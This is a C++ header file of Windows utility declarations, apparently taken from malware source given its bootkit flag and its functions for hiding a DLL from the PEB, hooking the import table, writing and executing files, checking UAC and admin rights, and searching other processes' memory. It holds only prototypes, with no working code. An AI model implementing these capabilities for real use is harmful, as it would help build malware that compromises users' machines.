#ifndef _UTILS_H_
#define _UTILS_H_

#include "ntdll.h"
#include "..\common\config.h"

#define ALIGN_DOWN(x, align)(x &~ (align - 1))
#define ALIGN_UP(x, align)((x & (align - 1))?ALIGN_DOWN(x, align) + align:x)
#define RVA_TO_VA(B,O) ((PCHAR)(((PCHAR)(B)) + ((ULONG_PTR)(O))))
#define RtlOffsetToPointer(B,O) ((PCHAR)(((PCHAR)(B)) + ((ULONG_PTR)(O))))
#define RtlPointerToOffset(B,P) ((ULONG_PTR)(((PCHAR)(P)) - ((PCHAR)(B))))
#define FlagOn(x, f) ((x) & (f))
#define MAKE_PTR(B, O, T) ((T)RtlOffsetToPointer(B, O))

//#define BOOTKIT

#define IFMT32 "0x%.8x"
#define IFMT64 "0x%.16I64x"

#define IFMT32_W L"0x%.8x"
#define IFMT64_W L"0x%.16I64x"

#ifndef _WIN64
#define IFMT IFMT32
#define IFMT_W IFMT32_W
#else
#define IFMT IFMT64
#define IFMT_W IFMT64_W
#endif

#if BO_DEBUG > 0
	VOID  __cdecl DbgMsg(PCHAR PrintFormat, ...);
	#define WDEBUG(format, ...) DbgMsg(__FUNCTION__"(): "format"\r\n", __VA_ARGS__)
#else
	#define WDEBUG(...)
	#define DbgMsg(...)
#endif

	PVOID __cdecl malloc(size_t Size);
	VOID __cdecl free(PVOID Pointer);
	PVOID __cdecl realloc(PVOID Pointer, size_t NewSize);
	int xwcsicmp(wchar_t *s1, wchar_t *s2);
	int xstrcmp(char *s1, char *s2);
	size_t xstrlen(char *org);
	VOID xRtlInitAnsiString(PANSI_STRING DestinationString, PCHAR SourceString);
	PCHAR UtiStrNCpyM(PCHAR pcSrc, DWORD_PTR dwLen);
	VOID UtiStrNCpy(PCHAR pcDst, PCHAR pcSrc, DWORD_PTR dwLen);

namespace Utils
{
	VOID DeleteFileReboot(PCHAR pcFilePath);
	PVOID ReadLogsFromFile(PDWORD Len);
	VOID WriteLogMessage(PCHAR DebugMessage);

	VOID GetRandomString(PCHAR lpszBuf, DWORD cbBuf);
	HANDLE CreateCheckMutex(DWORD Id, PCHAR Sign);
	BOOLEAN CheckMutex(DWORD Id, PCHAR Sign);

	BOOL IsWow64(HANDLE ProcessHandle);
	DWORD GetProcessIntegrityLevel();
	BOOL CheckAdmin();
	BOOL CheckUAC();
	VOID GetWindowsVersion(PCHAR pcBuffer, DWORD dwSize);

	VOID GetParrentProcessName(PCHAR FileName, DWORD Size);
	DWORD GetProcessIdByName(PCHAR ProcessName, PDWORD Processes, DWORD Max);

	NTSTATUS MapSection(PWCHAR SectionName, PHANDLE SectionHandle, PVOID *BaseAddress, DWORD_PTR *ViewSize);
	BOOLEAN CreateImageSection(PCHAR pName, PVOID ImageBase, DWORD ImageSize, HANDLE *phCurrentImageSection);
	VOID HideDllPeb(LPCSTR lpDllName);

	DWORD ThreadCreate(PVOID pvFunc, PVOID pvParam, PHANDLE phHandle, DWORD dwWaitSec = 0);
	VOID PrintSystemTime(PCHAR lpszBuf, DWORD cbBuf);
	LONG RegReadValue(HKEY RootKeyHandle, PCHAR SubKeyName, PCHAR ValueName, DWORD Type, PVOID Buffer, DWORD Len);
	DWORD _getValueAsBinaryEx(HKEY key, const LPSTR subKey, const LPSTR value, LPDWORD type, void **buffer);
	BOOLEAN ReplaceIAT(PCHAR ModuleName, PCHAR Current, PVOID New, HMODULE Module);
	BOOLEAN StringTokenBreak(PCHAR *ppcSrc, PCHAR pcToken, PCHAR *ppcBuffer);
	BOOL SetPrivilege(char* SeNamePriv, BOOL EnableTF);
	
	VOID RestartModuleShellExec(PCHAR FilePath);
	BOOL StartExe(LPSTR lpFilePath);
	BOOLEAN WriteFileAndExecute(PVOID File, DWORD Size);

	DWORD_PTR ExecExportProcedure(PVOID ModuleBase, PCHAR pcProcedure, PCHAR pcParameters);

	PVOID UtiCryptRc4M(PCHAR pcKey, DWORD dwKey, PVOID pvBuffer, DWORD dwBuffer);
	VOID UtiCryptRc4(PCHAR pcKey, DWORD dwKey, PVOID pvDst, PVOID pvSrc, DWORD dwLen);

	DWORD SearchBytesInMemory(PVOID RegionCopy, DWORD_PTR RegionSize, PVOID Bytes, DWORD Length);
	DWORD SearchDwordInMemory(PVOID RegionCopy, DWORD_PTR RegionSize, DWORD Dword);
	DWORD SearchBytesInReadedMemory(HANDLE ProcessHandle, PVOID BaseAddress, DWORD_PTR Size, PVOID Bytes, DWORD Length);
	PVOID SearchBytesInProcessMemory(HANDLE ProcessHandle, PVOID Bytes, DWORD Length);
	DWORD SearchCodeInProcessModules(HANDLE ProcessHandle, PVOID Bytes, DWORD Length);
	VOID FixDWORD(BYTE *Data,DWORD Size,DWORD Old,DWORD New);

	PVOID MapBinary(LPCSTR lpPath,DWORD dwFileAccess,DWORD dwFileFlags,DWORD dwPageAccess,DWORD dwMapAccess,PDWORD pdwSize);
	BOOLEAN FileHandleWrite(HANDLE hFile, PVOID pvBuffer, DWORD dwBuffer, DWORD Pointer);
	BOOLEAN FileWrite(PCHAR FilePath, DWORD dwFlags, PVOID pvBuffer, DWORD dwSize, DWORD Pointer = FILE_BEGIN);
	PVOID FileHandleRead(HANDLE hFile, PDWORD pdwBuffer);
	PVOID FileRead(PCHAR lpFile, PDWORD pdwSize);
	HANDLE FileLock(PCHAR lpFile, DWORD dwAccess, DWORD dwDisposition);
	VOID FileUnlock(HANDLE hFile);

	VOID XorCrypt(PVOID source, DWORD size, DWORD key);

	DWORD crc32Hash(const void *data, DWORD size);
};


typedef struct _WINET_LOADURL
{
	PCHAR pcUrl;
	PCHAR pcMethod;
	PCHAR pcHeaders;
	DWORD dwHeaders;
	PVOID pvPstData;
	DWORD dwPstData;
	DWORD dwStatus;
	DWORD dwBuffer;
	DWORD dwRetry;
} 
WINET_LOADURL, *PWINET_LOADURL;

PVOID WinetLoadUrl(PWINET_LOADURL pwlLoadUrl);
PVOID WinetLoadUrlWait(PWINET_LOADURL pwlLoadUrl, DWORD dwWait);
VOID WinetSetUserAgent(PCHAR pcUserAgent);


#endif

